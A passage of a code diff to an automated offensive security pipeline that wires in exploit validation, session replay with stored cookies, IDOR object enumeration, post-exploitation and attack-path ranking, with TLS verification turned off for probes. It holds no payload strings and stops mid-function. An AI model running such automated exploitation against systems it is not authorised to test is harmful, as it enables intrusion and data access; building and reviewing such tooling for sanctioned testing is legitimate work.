         (out / "auth_findings.json").write_text(
             json.dumps({"findings": findings}, indent=2)
         )
@@ -1086,9 +1810,12 @@ class CanonicalExecutor:
 
         # ── Original simulation engine ─────────────────────────────────────
         try:
+            import asyncio as _asyncio
             from oneinfinity.attack_simulation_engine import AttackSimulationEngine
             engine = AttackSimulationEngine()
-            sim_results = engine.simulate_all_paths()
+            sim_results = _asyncio.run(
+                engine.simulate_all_paths(target=probe_target, context={})
+            )
             for path_result in (sim_results or []):
                 if isinstance(path_result, dict):
                     path_result.setdefault("source_type", "simulated")
@@ -1138,6 +1865,30 @@ class CanonicalExecutor:
         except Exception as exc:
             log.debug("business_logic payment tampering: %s", exc)
 
+        # ── P1.4: LLM Business Logic Analyzer ────────────────────────────────
+        # async — bridged via asyncio.run(). Safe without LLM keys (returns structural findings).
+        # NOTE: skipped if early-return at line 1192 fired (pre-seeded attack_simulation.json).
+        try:
+            import asyncio as _asyncio_bl
+            from oneinfinity.scan.llm_business_logic_analyzer import LLMBusinessLogicAnalyzer
+            _llm_bla = LLMBusinessLogicAnalyzer()
+            _llm_result = _asyncio_bl.run(
+                _llm_bla.analyze(probe_target, traffic_limit=200, enable_validation=False)
+            )
+            for _bv in (_llm_result.vulnerabilities or []):
+                _fd = _bv.to_dict() if hasattr(_bv, "to_dict") else (_bv if isinstance(_bv, dict) else vars(_bv))
+                _fd["source_type"] = "llm_business_logic"
+                _fd["vuln_type"] = _fd.pop("category", _fd.get("vuln_type", "Business Logic Flaw"))
+                _fd["url"] = _fd.pop("affected_endpoint", _fd.get("url", probe_target))
+                _fd.setdefault("endpoint", _fd["url"])
+                findings.append(_fd)
+            if (_llm_result.vulnerabilities or []):
+                log.info("business_logic LLM analyzer: %d findings", len(_llm_result.vulnerabilities))
+        except ImportError:
+            log.debug("business_logic LLMBusinessLogicAnalyzer not available")
+        except Exception as _bla_exc:
+            log.debug("business_logic LLMBusinessLogicAnalyzer failed (non-fatal): %s", _bla_exc)
+
         return findings
 
     def _inline_exploit_validation(self, target: str, out: Path) -> List[dict]:
@@ -1147,15 +1898,241 @@ class CanonicalExecutor:
             all_f = self._load_findings_from_dir(out)
             engine = WebValidationEngine()
             results = engine.validate_all(all_f)
-            # apply_results is a method on the engine instance
             updated = engine.apply_results(all_f, results)
             confirmed = [f for f in updated if f.get("validation_status") == "confirmed"]
             (out / "validation_results.json").write_text(
                 json.dumps({"validated": len(confirmed), "findings": confirmed}, indent=2)
             )
-            return confirmed
+            findings.extend(confirmed)
         except Exception as exc:
             log.warning("exploit_validation inline failed: %s", exc)
+
+        # ── P1.5: DifferentialScanner — auth vs unauth access-control comparison ──
+        # Security council: only useful when auth_headers is non-empty.
+        # Endpoint list extracted from loaded findings so comparisons are targeted.
+        try:
+            _auth_hdrs = self._build_auth_headers()
+            if _auth_hdrs:  # mandatory guard — empty = no signal, just wasted requests
+                import asyncio as _asyncio_diff
+                from oneinfinity.scan.differential_scanner import DifferentialScanner
+                probe_target = target if target.startswith("http") else f"https://{target}"
+                _all_f_for_diff = self._load_findings_from_dir(out)
+                _endpoints = list({
+                    f.get("url", f.get("endpoint", ""))
+                    for f in _all_f_for_diff
+                    if f.get("url", f.get("endpoint", ""))
+                })[:30]
+                if _endpoints:
+                    _diff_scanner = DifferentialScanner(
+                        target=probe_target,
+                        auth_headers=_auth_hdrs,
+                    )
+                    _diff_findings = _asyncio_diff.run(
+                        _diff_scanner.scan(_endpoints, methods=["GET"])
+                    )
+                    for _df in (_diff_findings or []):
+                        _fd = _df.to_dict() if hasattr(_df, "to_dict") else (_df if isinstance(_df, dict) else vars(_df))
+                        _fd.setdefault("source_type", "differential")
+                        _fd.setdefault("validation_status", "confirmed")
+                        findings.append(_fd)
+                    if _diff_findings:
+                        log.info("exploit_validation differential: %d access-control findings", len(_diff_findings))
+            else:
+                log.debug("exploit_validation DifferentialScanner skipped — no auth credentials configured")
+        except ImportError:
+            log.debug("exploit_validation DifferentialScanner not available")
+        except Exception as _diff_exc:
+            log.warning("exploit_validation DifferentialScanner failed (non-fatal): %s", _diff_exc)
+        # ── Session Replay — re-test confirmed findings with alternate auth states ──
+        # Replays each confirmed finding's URL using stored sessions to catch
+        # auth-state-dependent vulnerabilities (e.g. same endpoint accessible
+        # as different roles, session fixation across auth boundaries).
+        try:
+            from oneinfinity.auth.session_manager import SessionManager
+            from oneinfinity.auth.session_replay import SessionReplay
+            from oneinfinity.auth.auth_session_context import AuthSessionContext
+            _sm = SessionManager()
+            _all_sessions = _sm.list_all()
+            _probe_target_sr = target if target.startswith("http") else f"https://{target}"
+            _target_sessions = [
+                s for s in _all_sessions
+                if s.target and (
+                    s.target in _probe_target_sr
+                    or _probe_target_sr.rstrip("/").endswith(s.target.rstrip("/"))
+                )
+            ]
+            if _target_sessions:
+                # Collect confirmed findings that have a replayable URL
+                _confirmed_for_replay = [
+                    f for f in findings
+                    if f.get("validation_status") == "confirmed"
+                    and (f.get("url") or f.get("endpoint"))
+                ][:20]
+
+                _replay = SessionReplay()
+                _sr_results: list = []
+
+                for _sess in _target_sessions[:4]:  # cap to 4 sessions to bound request count
+                    _ctx = AuthSessionContext(_sess)
+                    # Refresh session via HAR replay if stale
+                    if _sess.har_path:
+                        _replay.replay(_sess)
+                    # Probe each confirmed finding's endpoint with this session's auth
+                    try:
+                        import urllib.request as _ur_sr
+                        import ssl as _ssl_sr
+                        _ssl_ctx_sr = _ssl_sr.create_default_context()
+                        _ssl_ctx_sr.check_hostname = False
+                        _ssl_ctx_sr.verify_mode = _ssl_sr.CERT_NONE
+                        for _cf in _confirmed_for_replay:
+                            _cf_url = _cf.get("url") or _cf.get("endpoint", "")
+                            if not _cf_url:
+                                continue
+                            try:
+                                _sr_req = _ur_sr.Request(
+                                    _cf_url, headers={"User-Agent": "Mozilla/5.0"}
+                                )
+                                # Inject session cookies
+                                _cookie_str = "; ".join(
+                                    f"{c.get('name','')}={c.get('value','')}"
+                                    for c in (_sess.cookies or [])
+                                    if c.get("name")
+                                )
+                                if _cookie_str:
+                                    _sr_req.add_header("Cookie", _cookie_str)
+                                for _hk, _hv in (_sess.auth_headers or {}).items():
+                                    if _hv:
+                                        _sr_req.add_header(_hk, _hv)
+                                with _ur_sr.urlopen(_sr_req, timeout=6, context=_ssl_ctx_sr) as _sr_resp:
+                                    _sr_status = _sr_resp.status
+                                    _sr_body = _sr_resp.read(4096).decode("utf-8", errors="replace")
+                                # If the endpoint responds 200 with a different session → auth-state vuln
+                                if _sr_status == 200:
+                                    _sr_finding = {
+                                        "vuln_type": "session_replay_access",
+                                        "severity": "high",
+                                        "url": _cf_url,
+                                        "endpoint": _cf_url,
+                                        "evidence": (
+                                            f"URL {_cf_url} responded HTTP 200 when replayed "
+                                            f"with session {_sess.session_id[:8]} "
+                                            f"(recorded_at={_sess.recorded_at:.0f}). "
+                                            f"Original finding: {_cf.get('vuln_type','')}"
+                                        ),
+                                        "confidence": 0.75,
+                                        "source_type": "session_replay",
+                                        "validation_status": "confirmed",
+                                        "session_id": _sess.session_id,
+                                        "replay_status": _sr_status,
+                                    }
+                                    _sr_results.append(_sr_finding)
+                                    findings.append(_sr_finding)
+                                    try:
+                                        from oneinfinity.core.db_manager import get_db_manager_sync
+                                        get_db_manager_sync().sync_save_finding(_sr_finding)
+                                    except Exception:
+                                        pass
+                            except Exception:
+                                pass
+                    except Exception as _sr_inner:
+                        log.debug("exploit_validation session_replay inner failed: %s", _sr_inner)
+
+                if _sr_results:
+                    log.info(
+                        "exploit_validation session_replay: %d auth-state findings across %d sessions",
+                        len(_sr_results), len(_target_sessions),
+                    )
+            else:
+                log.debug("exploit_validation session_replay: no sessions stored for %s", target)
+        except Exception as _sr_exc:
+            log.debug("exploit_validation session_replay failed (non-fatal): %s", _sr_exc)
+
+        # ── AutonomousExploitEngine — safe proof-of-exploitability per high/critical ──
+        try:
+            from oneinfinity.attack.autonomous_exploit_engine import AutonomousExploitEngine
+            _aee = AutonomousExploitEngine()
+            _high_crit = [
+                f for f in findings
+                if str(f.get("severity", "")).lower() in ("critical", "high")
+            ]
+            _aee_results: list = []
+            for _hf in _high_crit[:20]:  # cap to avoid runaway re-exploitation
+                try:
+                    _vr = _aee.validate_finding(_hf)
+                    if _vr.get("validated") and _vr.get("status") == "confirmed":
+                        _hf["aee_confirmed"] = True
+                        _hf["aee_evidence"] = _vr.get("evidence", "")
+                        _hf["aee_confidence"] = _vr.get("confidence", 0.92)
+                        _aee_results.append(_vr)
+                    elif _vr.get("status") == "false_positive":
+                        _hf["aee_confirmed"] = False
+                        _hf["validation_status"] = "false_positive"
+                except Exception as _aee_inner:
+                    log.debug("exploit_validation AEE inner failed for %s: %s",
+                              _hf.get("finding_id", "?"), _aee_inner)
+            if _aee_results:
+                log.info("exploit_validation AutonomousExploitEngine: %d confirmed high/critical", len(_aee_results))
+        except Exception as _aee_exc:
+            log.debug("exploit_validation AutonomousExploitEngine failed (non-fatal): %s", _aee_exc)
+
+        # ── NucleiTemplateGenerator — generate custom template per confirmed finding ──
+        _custom_template_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
+        _generated_template_paths: list = []
+        try:
+            from oneinfinity.attack.nuclei_template_generator import NucleiTemplateGenerator as _NTG
+            _ntg = _NTG()
+            _confirmed_for_templates = [
+                f for f in findings
+                if f.get("validation_status") == "confirmed"
+                and (f.get("url") or f.get("target"))
+            ]
+            for _cf in _confirmed_for_templates[:50]:
+                try:
+                    _tpl_path = _ntg.save(_cf, output_dir=_custom_template_dir)
+                    _generated_template_paths.append(_tpl_path)
+                    _cf.setdefault("nuclei_template", _tpl_path)
+                except Exception as _tpl_inner:
+                    log.debug("exploit_validation NucleiGen inner failed: %s", _tpl_inner)
+            if _generated_template_paths:
+                log.info("exploit_validation NucleiGen: %d custom templates saved to %s",
+                         len(_generated_template_paths), _custom_template_dir)
+                # Persist template paths so vuln_scan phase can reuse them
+                try:
+                    _tpl_index = out / "custom_nuclei_templates.json"
+                    _tpl_index.write_text(
+                        json.dumps({"template_dir": _custom_template_dir,
+                                    "paths": _generated_template_paths}, indent=2)
+                    )
+                except Exception:
+                    pass
+        except Exception as _ntg_exc:
+            log.debug("exploit_validation NucleiTemplateGenerator failed (non-fatal): %s", _ntg_exc)
+
+        # ── AutonomousExploitEngine: controlled re-exploitation per high/critical finding ─
+        try:
+            _unconfirmed_hc = [f for f in self._load_findings_from_dir(out)
+                               if f.get("severity") in ("high", "critical")
+                               and f.get("validation_status") not in ("confirmed", "exploited", "false_positive")]
+            if _unconfirmed_hc:
+                from oneinfinity.attack.autonomous_exploit_engine import AutonomousExploitEngine
+                _aee = AutonomousExploitEngine()
+                _confirmed_by_aee = 0
+                for _uf in _unconfirmed_hc[:10]:  # cap: 10 per phase to control timing
+                    try:
+                        _result = _aee.validate_finding(_uf)
+                        if isinstance(_result, dict) and _result.get("status") == "confirmed":
+                            _uf["validation_status"] = "confirmed"
+                            _uf["confidence"] = min(1.0, float(_uf.get("confidence", 0.5)) + 0.20)
+                            _uf.setdefault("source_type", "tool")
+                            findings.append(_uf)
+                            _confirmed_by_aee += 1
+                    except Exception:
+                        pass
+                if _confirmed_by_aee:
+                    log.info("exploit_validation AutonomousExploitEngine: %d findings re-confirmed", _confirmed_by_aee)
+        except Exception as _aee_exc:
+            log.debug("exploit_validation AutonomousExploitEngine failed (non-fatal): %s", _aee_exc)
+
         return findings
 
     def _inline_exploit_chains(self, target: str, out: Path) -> List[dict]:
@@ -1186,9 +2163,258 @@ class CanonicalExecutor:
             )
         except Exception as exc:
             log.warning("exploit_chains inline failed: %s", exc)
+
+        # ── AttackPathPlanner: BFS-scored ranked attack paths from all findings ──
+        # Converts findings into a scored attack graph (BFS), ranks paths by
+        # (exploitability × impact × probability), emits each as attack_path finding.
+        try:
+            from oneinfinity.attack.attack_path_planner import AttackPathPlanner
+            _all_f_for_plan = self._load_findings_from_dir(out)
+            _planner = AttackPathPlanner()
+            _recon_data: dict = {}
+            _recon_f = out / "adaptive_recon.json"
+            if _recon_f.exists():
+                try:
+                    _recon_data = json.loads(_recon_f.read_text())
+                except Exception:
+                    pass
+            # plan() = build_graph + find_paths, returns ranked AttackPath list
+            _ranked_paths = _planner.plan(_all_f_for_plan, target,
+                                          recon_data=_recon_data, max_paths=10)
+            # Also detect atomic chains for the findings list
+            _app_chains = _planner.detect_chains(_all_f_for_plan)
+            # Emit each ranked attack path as an 'attack_path' finding
+            for _rank, _ap in enumerate(_ranked_paths):
+                _ap_d = _ap.to_dict() if hasattr(_ap, "to_dict") else (
+                    _ap if isinstance(_ap, dict) else vars(_ap)
+                )
+                _ap_finding = {
+                    "vuln_type": "attack_path",
+                    "severity": "critical" if _ap_d.get("impact_score", 0) >= 0.75 else "high",
+                    "url": target,
+                    "endpoint": target,
+                    "title": f"[Attack Path #{_rank + 1}] {_ap_d.get('chain_description', _ap_d.get('path_id', ''))}",
+                    "evidence": (
+                        f"path_id={_ap_d.get('path_id','?')} "
+                        f"score={_ap_d.get('total_score', 0):.2f} "
+                        f"exploitability={_ap_d.get('exploitability_score', 0):.2f} "
+                        f"impact={_ap_d.get('impact_score', 0):.2f} "
+                        f"difficulty={_ap_d.get('difficulty', '?')} "
+                        f"steps={len(_ap_d.get('nodes', []))}"
+                    ),
+                    "confidence": min(0.95, 0.5 + _ap_d.get("exploitability_score", 0)),
+                    "source_type": "attack_path_planner",
+                    "validation_status": "confirmed",
+                    "attack_path_rank": _rank + 1,
+                    "attack_path_score": _ap_d.get("total_score", 0),
+                    "attack_path_data": _ap_d,
+                }
+                findings.append(_ap_finding)
+                # Store in PostgreSQL
+                try:
+                    from oneinfinity.core.db_manager import get_db_manager_sync
+                    get_db_manager_sync().sync_save_finding(_ap_finding)
+                except Exception:
+                    pass
+                # Store in Neo4j
+                try:
+                    from oneinfinity.attack_graph_core import AttackGraphBuilder
+                    _agb = AttackGraphBuilder(target)
+                    _agb.add_finding(_ap_finding)
+                except Exception:
+                    pass
+            # Append detected chains as findings
+            for _chain in _app_chains:
+                _cd = _chain.to_dict() if hasattr(_chain, "to_dict") else (
+                    _chain if isinstance(_chain, dict) else vars(_chain)
+                )
+                _cd.setdefault("source_type", "attack_path_planner")
+                _cd.setdefault("vuln_type", f"attack_chain:{_cd.get('chain_id', 'unknown')}")
+                _cd.setdefault("severity", _cd.get("combined_severity", "high"))
+                _cd.setdefault("confidence", 0.75)
+                _cd.setdefault("url", target)
+                findings.append(_cd)
+            if _ranked_paths:
+                log.info(
+                    "exploit_chains AttackPathPlanner: %d ranked paths, %d chains → %s",
+                    len(_ranked_paths), len(_app_chains), target,
+                )
+            # Save to file for UI/reporting
+            try:
+                (out / "attack_paths.json").write_text(
+                    json.dumps(
+                        {"paths": [
+                            (_ap.to_dict() if hasattr(_ap, "to_dict") else vars(_ap))
+                            for _ap in _ranked_paths
+                        ]},
+                        indent=2, default=str,
+                    )
+                )
+            except Exception:
+                pass
+        except Exception as _app_exc:
+            log.debug("exploit_chains AttackPathPlanner failed (non-fatal): %s", _app_exc)
+
+        # ── PostExploitEngine: post-exploitation on confirmed high/critical ───
+        # Explicitly wires SSRF→cloud enum and IDOR→data enum paths.
+        try:
+            _all_f_pe = self._load_findings_from_dir(out)
+            _hc_findings = [
+                f for f in _all_f_pe
+                if str(f.get("severity", "")).lower() in ("high", "critical")
+                and f.get("validation_status") in ("confirmed", "exploited", None)
+            ]
+            if _hc_findings:
+                from oneinfinity.attack.post_exploit_engine import PostExploitEngine
+                _pe = PostExploitEngine(target=target, findings=_hc_findings)
+                _pe_results = _pe.run()
+                # ── Explicit IDOR → data enumeration path ──────────────────
+                # For every IDOR finding, enumerate sequential object IDs to
+                # demonstrate data access breadth (safe: read-only GET probes).
+                _idor_findings = [
+                    f for f in _hc_findings
+                    if "idor" in str(f.get("vuln_type", "")).lower()
+                ]
+                for _if in _idor_findings[:3]:
+                    _idor_url = _if.get("url", "") or _if.get("endpoint", "")
+                    if not _idor_url:
+                        continue
+                    try:
+                        import urllib.request as _ur_idor
+                        import ssl as _ssl_idor
+                        import re as _re_idor
+                        _ssl_ctx_idor = _ssl_idor.create_default_context()
+                        _ssl_ctx_idor.check_hostname = False
+                        _ssl_ctx_idor.verify_mode = _ssl_idor.CERT_NONE
+                        # Replace numeric path segments to probe adjacent IDs
+                        _base_url = _re_idor.sub(r'/(\d+)', '/{id}', _idor_url)
+                        _enum_hits = []
+                        for _oid in range(1, 6):  # probe IDs 1–5 (non-destructive)
+                            _probe = _base_url.replace("{id}", str(_oid))
+                            if _probe == _idor_url:
+                                continue  # skip known-vulnerable URL
+                            try:
+                                _req = _ur_idor.Request(_probe,
+                                                        headers={"User-Agent": "Mozilla/5.0"})
+                                with _ur_idor.urlopen(_req, timeout=5,
+                                                      context=_ssl_ctx_idor) as _r:
+                                    if _r.status == 200:
+                                        _enum_hits.append(_probe)
+                            except Exception:
+                                pass
+                        if _enum_hits:
+                            from oneinfinity.attack.post_exploit_engine import PostExploitFinding
+                            _pe_results.append(PostExploitFinding(
+                                vuln_type="idor_data_enumeration",
+                                title=f"IDOR data enum: {len(_enum_hits)} object IDs accessible",
+                                severity="critical",
+                                url=_idor_url,
+                                evidence=(
+                                    f"Enumerated {len(_enum_hits)} adjacent object IDs via IDOR.\n"
+                                    f"Base URL pattern: {_base_url}\n"
+                                    f"Accessible IDs: {_enum_hits}"
+                                ),
+                                source="idor_data_enum",
+                                tool="idor_data_enum",
+                            ))
+                            log.info(
+                                "post_exploit IDOR data enum: %d objects accessible via %s",
+                                len(_enum_hits), _base_url,
+                            )
+                    except Exception as _idor_inner:
+                        log.debug("post_exploit IDOR data enum failed for %s: %s",
+                                  _idor_url, _idor_inner)
+
+                for _per in (_pe_results or []):
+                    _pfd = _per.__dict__ if hasattr(_per, "__dict__") else (
+                        _per if isinstance(_per, dict) else {}
+                    )
+                    if not _pfd:
+                        continue
+                    _pfd.setdefault("source_type", "post_exploit")
+                    _pfd.setdefault("confidence", 0.80)
+                    _pfd.setdefault("url", target)
+                    _pfd.setdefault("validation_status", "confirmed")
+                    findings.append(_pfd)
+                    # Store in PostgreSQL
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        get_db_manager_sync().sync_save_finding(_pfd)
+                    except Exception:
+                        pass
+                    # Store in Neo4j
+                    try:
+                        from oneinfinity.attack_graph_core import AttackGraphBuilder
+                        _agb_pe = AttackGraphBuilder(target)
+                        _agb_pe.add_finding(_pfd)
+                    except Exception:
+                        pass
+                if _pe_results:
+                    log.info(
+                        "exploit_chains PostExploitEngine: %d findings (SSRF+IDOR+token+privesc)",
+                        len(_pe_results),
+                    )
+                    try:
+                        (out / "post_exploit_findings.json").write_text(
+                            json.dumps({"findings": [
+                                (_p.__dict__ if hasattr(_p, "__dict__") else _p)
+                                for _p in _pe_results
+                            ]}, indent=2, default=str)
+                        )
+                    except Exception:
+                        pass
+        except Exception as _pe_exc:
+            log.debug("exploit_chains PostExploitEngine failed (non-fatal): %s", _pe_exc)
+
+        # ── NucleiTemplateGenerator: generate templates for confirmed findings ─
+        # generate_batch() saves files and returns list[str] of saved paths.
+        # No secondary write needed — just log and index.
+        try:
+            _all_f_ntg = self._load_findings_from_dir(out)
+            _confirmed_ntg = [
+                f for f in _all_f_ntg
+                if f.get("validation_status") in ("confirmed", "exploited")
+                and float(f.get("confidence") or 0) >= 0.75
+                and (f.get("url") or f.get("target"))
+            ]
+            if _confirmed_ntg:
+                from oneinfinity.attack.nuclei_template_generator import NucleiTemplateGenerator
+                _ntg = NucleiTemplateGenerator()
+                _custom_tpl_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
+                _saved_paths = _ntg.generate_batch(
+                    _confirmed_ntg,
+                    min_confidence=0.75,
+                    output_dir=_custom_tpl_dir,
+                )
+                if _saved_paths:
+                    log.info(
+                        "exploit_chains NucleiTemplateGenerator: %d templates → %s",
+                        len(_saved_paths), _custom_tpl_dir,
+                    )
+                    # Update the index file so vuln_scan phase picks up new templates
+                    try:
+                        _tpl_index = out / "custom_nuclei_templates.json"
+                        _existing: dict = {}
+                        if _tpl_index.exists():
+                            try:
+                                _existing = json.loads(_tpl_index.read_text())
+                            except Exception:
+                                pass
+                        _all_paths = list(dict.fromkeys(
+                            _existing.get("paths", []) + _saved_paths
+                        ))
+                        _tpl_index.write_text(
+                            json.dumps({"template_dir": _custom_tpl_dir,
+                                        "paths": _all_paths}, indent=2)
+                        )
+                    except Exception:
+                        pass
+        except Exception as _ntg_exc:
+            log.debug("exploit_chains NucleiTemplateGenerator failed (non-fatal): %s", _ntg_exc)
         return findings
 
     def _inline_attack_graph(self, target: str, out: Path) -> List[dict]:
+        findings: List[dict] = []
         try:
             from oneinfinity.attack_graph_core import AttackGraphBuilder
             builder = AttackGraphBuilder(target)
@@ -1202,10 +2428,31 @@ class CanonicalExecutor:
                 "edges": stats.get("total_edges", stats.get("edges", 0)),
                 "nodes_by_type": stats.get("nodes_by_type", {}),
             }
+            # Wire suggest_chains() — produces ranked attack paths from the graph
+            # These feed as simulated findings into exploit_chains and exploit_validation phases
+            try:
+                chains = builder.suggest_chains(min_exploitability=0.3)
+                graph_data["suggested_chains"] = [
+                    c if isinstance(c, dict) else (c.__dict__ if hasattr(c, "__dict__") else str(c))
+                    for c in (chains or [])
+                ]
+                for chain in (chains or []):
+                    fd = chain if isinstance(chain, dict) else (chain.__dict__ if hasattr(chain, "__dict__") else {})
+                    if fd:
+                        fd.setdefault("source_type", "simulated")
+                        fd.setdefault("vuln_type", fd.get("chain_type", fd.get("name", "attack_chain")))
+                        fd.setdefault("severity", fd.get("severity", "high"))
+                        fd.setdefault("confidence", fd.get("exploitability", 0.6))
+                        fd.setdefault("url", target)
+                        findings.append(fd)
+                if chains:
+                    log.info("attack_graph: %d chain suggestions for %s", len(chains), target)
+            except Exception as _sc_exc:
+                log.debug("attack_graph suggest_chains failed (non-fatal): %s", _sc_exc)
             (out / "attack_graph.json").write_text(json.dumps(graph_data, indent=2, default=str))
         except Exception as exc:
             log.warning("attack_graph inline failed: %s", exc)
-        return []  # Attack graph produces no new findings
+        return findings
 
     def _inline_ai_theory(self, target: str, out: Path) -> List[dict]:
         findings = []
@@ -1244,6 +2491,236 @@ class CanonicalExecutor:
             log.info("graphql_scan inline: %d findings for %s", len(findings), target)
         except Exception as exc:
             log.warning("graphql_scan inline failed (non-mandatory): %s", exc)
+        return findings
+
+    def _inline_advanced_scan(self, target: str, out: Path, waf: dict = None) -> List[dict]:
+        """
+        Run UnifiedAdvancedScanner.run_full_scan() — 32 scanners in parallel:
+        IDOR, race conditions, CAPTCHA bypass, JWT, NoSQL, SSTI, deserialization,
+        LDAP, SAML, prototype pollution, gRPC, SQLi, SSRF, path traversal, CORS,
+        XXE, subdomain takeover, HPP, client-side, OAuth leaks, PDF-SSRF, Redis
+        injection, rate-limit bypass, cache poisoning, DNS rebinding + attack chain
+        detection with PoC generation.
+
+        After scanning, feeds all findings through ExploitChainEngine.detect_chains_from_findings()
+        which populates the attack graph and stores detected chains in Neo4j.
+
+        Non-mandatory: import or runtime errors return [] so the pipeline continues.
+        Async — bridged via asyncio.run() (executor is synchronous).
+        """
+        import asyncio as _asyncio_adv
+        findings: List[dict] = []
+        try:
+            from oneinfinity.scan.unified_advanced_scanner import UnifiedAdvancedScanner
+            probe_url = target if target.startswith("http") else f"https://{target}"
+            scanner = UnifiedAdvancedScanner(target=probe_url)
+            scan_result = _asyncio_adv.run(
+                scanner.run_full_scan(
+                    account_configs=None,     # IDOR requires ≥2 accounts; skip by default
+                    source_filter=None,
+                    oob_domain=None,          # OOB callbacks require external listener
+                )
+            )
+            raw = scan_result.to_dict()
+            # Flatten all per-vuln-class finding lists (31 categories)
+            _finding_keys = [
+                "idor_findings", "race_findings", "bypass_findings",
+                "graphql_findings", "browser_findings", "smuggling_findings",
+                "business_logic_findings", "jwt_findings", "nosql_findings",
+                "ssti_findings", "deserialization_findings", "ldap_findings",
+                "saml_findings", "prototype_pollution_findings", "grpc_findings",
+                "sqli_findings", "ssrf_findings", "path_traversal_findings",
+                "cors_findings", "xxe_findings", "subdomain_takeover_findings",
+                "hpp_findings", "client_side_findings", "oauth_leak_findings",
+                "pdf_ssrf_findings", "unicode_norm_findings", "redis_injection_findings",
+                "rate_limiting_findings", "cache_poisoning_findings",
+                "dns_rebinding_findings", "validated_chains",
+            ]
+            for key in _finding_keys:
+                for item in raw.get(key, []):
+                    if not isinstance(item, dict):
+                        continue
+                    item.setdefault("source_type", "tool")
+                    item.setdefault("confidence", 0.75)
+                    item.setdefault("validation_status", "unverified")
+                    item.setdefault("vuln_class", key.replace("_findings", ""))
+                    findings.append(item)
+            # Attack chains as synthetic simulated findings
+            for chain in raw.get("attack_chains", []):
+                if isinstance(chain, dict):
+                    chain.setdefault("source_type", "simulated")
+                    chain.setdefault("vuln_type", f"exploit_chain:{chain.get('name', 'unknown')}")
+                    chain.setdefault("severity", chain.get("severity", "high"))
+                    chain.setdefault("confidence", 0.85)
+                    findings.append(chain)
+
+            # ── ExploitChainEngine: detect chains + store in Neo4j ─────────────
+            # Feeds flat findings list into the attack graph then runs pattern
+            # matching across all 15 CHAIN_DEFINITIONS (incl. GraphQL/Redis/MongoDB).
+            try:
+                from oneinfinity.attack_graph_core.exploit_chain_engine import ExploitChainEngine
+                _ece = ExploitChainEngine()
+                _chains = _ece.detect_chains_from_findings(findings, target=probe_url)
+                if _chains:
+                    log.info(
+                        "advanced_scan: ExploitChainEngine detected %d chains for %s",
+                        len(_chains), target,
+                    )
+                    # Append chain metadata as simulated findings for downstream phases
+                    for _c in _chains:
+                        findings.append({
+                            "source_type": "simulated",
+                            "vuln_type": f"exploit_chain:{_c.name}",
+                            "severity": _c.combined_severity,
+                            "confidence": min(_c.chain_score / 10.0, 1.0),
+                            "title": _c.name,
+                            "description": f"Chain detected by ExploitChainEngine: {_c.name}",
+                            "estimated_bounty": _c.estimated_bounty,
+                            "chain_id": str(_c.chain_id),
+                            "vuln_class": "exploit_chain",
+                        })
+            except Exception as _ece_exc:
+                log.debug("advanced_scan ExploitChainEngine failed (non-fatal): %s", _ece_exc)
+
+            # Write structured output file
+            (out / "advanced_findings.json").write_text(
+                json.dumps({
+                    "target": raw.get("target"),
+                    "total_findings": raw.get("total_findings", len(findings)),
+                    "risk_score": raw.get("risk_score", 0.0),
+                    "executive_summary": raw.get("executive_summary", ""),
+                    "attack_chains": raw.get("attack_chains", []),
+                    "findings": findings,
+                    "count": len(findings),
+                }, indent=2, default=str)
+            )
+            log.info("advanced_scan: %d findings, %d chains, risk=%.1f for %s",
+                     len(findings), len(raw.get("attack_chains", [])),
+                     raw.get("risk_score", 0.0), target)
+        except ImportError as exc:
+            log.warning("advanced_scan skipped — UnifiedAdvancedScanner not importable: %s", exc)
+        except Exception as exc:
+            log.warning("advanced_scan inline failed (non-mandatory): %s", exc)
+        return findings
+
+    def _inline_cicd_scan(self, target: str, out: Path) -> List[dict]:
+        """
+        CI/CD pipeline security scan: GitHub Actions workflow injection, secrets,
+        OIDC misconfiguration, unpinned Actions, RBAC excess.
+        Requires GITHUB_TOKEN env var. Without token, scan_github_repo returns
+        an empty report (no crash). Deriving repo from GitHub OSINT session data
+        or falling back to org guess from target domain.
+        """
+        findings: List[dict] = []
+        try:
+            import os as _os
+            _gh_token = _os.environ.get("GITHUB_TOKEN", "")
+            from oneinfinity.scan.cicd_vuln_scanner import CICDVulnerabilityScanner
+            # Derive a GitHub org/repo guess from target URL
+            from urllib.parse import urlparse as _up_cicd
+            _parsed = _up_cicd(target if "://" in target else f"https://{target}")
+            _host = (_parsed.hostname or "").lstrip("www.")
+            _org_guess = _host.split(".")[0] if _host else ""
+            if not _org_guess:
+                log.debug("cicd_scan: cannot derive org name from target %s — skipping", target)
+                return findings
+            # Try org-level scan — assumes _org_guess is a GitHub org or owner
+            _scanner = CICDVulnerabilityScanner(github_token=_gh_token)
+            # Use org as repo prefix — scanner normalises "owner/repo" or full URL
+            # Scanning the org itself requires iterating repos; scan the most likely top-level repo
+            _repo_guess = _org_guess  # scan_github_repo will try "<org>/<org>" pattern
+            try:
+                report = _scanner.scan_github_repo(_repo_guess)
+                for _f in (report.findings or []):
+                    _fd = _f.to_dict() if hasattr(_f, "to_dict") else (vars(_f) if hasattr(_f, "__dict__") else {})
+                    _fd.setdefault("source_type", "tool")
+                    _fd.setdefault("confidence", 0.85)
+                    findings.append(_fd)
+                if report.findings:
+                    log.info("cicd_scan: %d findings for repo=%s", len(report.findings), _repo_guess)
+            except Exception as _scan_exc:
+                log.debug("cicd_scan scan_github_repo failed: %s", _scan_exc)
+            (out / "cicd_findings.json").write_text(
+                json.dumps({"findings": findings, "count": len(findings)}, indent=2, default=str)
+            )
+        except ImportError:
+            log.debug("cicd_scan: CICDVulnerabilityScanner not available")
+        except Exception as exc:
+            log.warning("cicd_scan inline failed (non-mandatory): %s", exc)
+        return findings
+
+    def _inline_container_scan(self, target: str, out: Path) -> List[dict]:
+        """
+        Kubernetes / container escape scanner: privileged containers, hostPath mounts,
+        RBAC wildcard, exposed etcd, API server misconfigs, Docker socket exposure.
+        Also runs the eBPF syscall tracer to detect suspicious kernel activity (Linux/root only).
+        Synchronous — no asyncio bridge needed.
+        """
+        findings: List[dict] = []
+        probe_url = target if target.startswith("http") else f"https://{target}"
+        scan_id = uuid.uuid4().hex[:16]
+
+        # ── ContainerEscapeScanner ─────────────────────────────────────────
+        try:
+            from oneinfinity.scan.container_escape_scanner import ContainerEscapeScanner
+            _scanner = ContainerEscapeScanner(target=probe_url, timeout=8)
+            _raw_findings = _scanner.run()
+            for _f in (_raw_findings or []):
